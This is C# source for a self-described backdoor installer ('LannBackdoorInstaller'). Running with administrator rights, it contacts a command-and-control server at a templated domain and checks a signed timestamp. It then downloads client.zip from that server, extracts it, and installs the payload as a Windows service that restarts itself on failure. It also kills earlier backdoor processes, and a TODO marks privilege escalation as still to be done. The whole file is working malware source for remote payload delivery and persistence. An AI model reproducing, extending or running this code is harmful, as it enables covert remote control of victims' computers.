using System.Diagnostics;
using System.IO.Compression;
using System.Security.Principal;
using System.Text;
using LannLogger;
using LBIJson;
using Serilog.Core;
using SystemModule;
using InstallerUtils;
using Constants = LannConstants.Constants;

namespace LannBackdoorInstaller;

#pragma warning disable CA1416

public static class LBLoader {
    private static Logger Logger = LoggerFactory.CreateLogger("LannBackdoorInstaller");

    private static readonly bool IsAdministrator = new WindowsPrincipal(WindowsIdentity.GetCurrent())
        .IsInRole(WindowsBuiltInRole.Administrator);

    private static string URL;
    private static int serverId;

    public static async Task Main(string[] args) {
        Console.OutputEncoding = Encoding.UTF8;
        if (Constants.Debug) Logger.Debug("Running {Mode} mode", "DEBUG");

        Logger.Warning("TODO: {0}", "Escalate Privileges");
        Logger.Information("Running as {Role}",
            IsAdministrator ? "Administrator" : "User");
        if (!IsAdministrator) return;

        Logger.Information("Retrieving URL...");
        URL = await RetrieveUrl();
        Logger.Information("Found valid URL: {Url}", URL);

        Logger.Information("Installing...");
        await Install();

        Logger.Information("Installation success, service started.");
    }

    private static async Task<string> RetrieveUrl() {
        string url = "http://" + Constants.Domain.Replace("{0}", (++serverId).ToString());
        try {
            VerifyHTTPResponse response = await WebUtils.DownloadJson<VerifyHTTPResponse>(url + "/verify");
            long timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
            long diff = Math.Abs(response.TimeStamp - timestamp);
            if (diff > 1000 * 15) {
                Logger.Error("Too big time difference {Diff} for server {Id}", diff, serverId);
                throw new Exception();
            }

            if (!Signing.VerifySigned(response.TimeStamp.ToString(), response.Signature)) {
                Logger.Error("Wrong signature for server {Id}", serverId);
                throw new Exception();
            }
        } catch (Exception error) {
            Logger.Error("Failed to retrieve url for server {Id}: {Error}", serverId, error);
            await Task.Delay(2000);
            return await RetrieveUrl();
        }

        return url;
    }

    private static async Task Uninstall() {
        if (ServiceManager.IsInstalled(Constants.ServiceName)) {
            Logger.Information("Stopping service...");
            await ServiceManager.Stop(Constants.ServiceName);

            Logger.Information("Uninstalling service...");
            await ServiceManager.Uninstall(Constants.ServiceName);
        }

        Logger.Information("Killing backdoor processes");
        Process[] processes = Process.GetProcessesByName(Constants.BackdoorFileName)
            .Concat(Process.GetProcessesByName(Constants.ServiceFileName))
            .ToArray();
        foreach (Process process in processes) {
            process.Kill();
            Logger.Information("Killed: {Name}", process.ProcessName);
        }
    }

    private static async Task Install() {
        await Uninstall();

        Logger.Information("Fetching Client...");
        using HttpClient client = new();
        using HttpResponseMessage message = await client.GetAsync(URL + "/client.zip");
        await using Stream stream = await message.Content.ReadAsStreamAsync();
        ;
        ZipArchive archive = new(stream);

        string path = Constants.InstallPath;
        Logger.Information("Extracting archive into: {Path}", path);

        if (File.Exists(path)) {
            Logger.Information("Path already exists, deleting...");
            FileSystem.RecursiveDelete(path);
        }

        Directory.CreateDirectory(path);
        Logger.Information("Created directory: {Path}", path);

        try {
            archive.ExtractToDirectory(path);
        } catch (Exception error) {
            Logger.Error("Failed to extract: {Error}", error);
            return;
        }

        Logger.Information("Installing service...");

        ServiceManager.Install(
            Constants.ServiceName,
            Constants.ServiceDisplayName,
            path + "/" + Constants.ServiceFileName
        );

        ServiceManager.SetFailureActions(
            Constants.ServiceName,
            new FailureAction(RecoverActionType.Restart, 5000),
            new FailureAction(RecoverActionType.Restart, 5000),
            new FailureAction(RecoverActionType.Restart, 5000),
            300
        );

        Logger.Information("Starting service...");
        await ServiceManager.Start(Constants.ServiceName);
    }
}

#pragma warning restore CA1416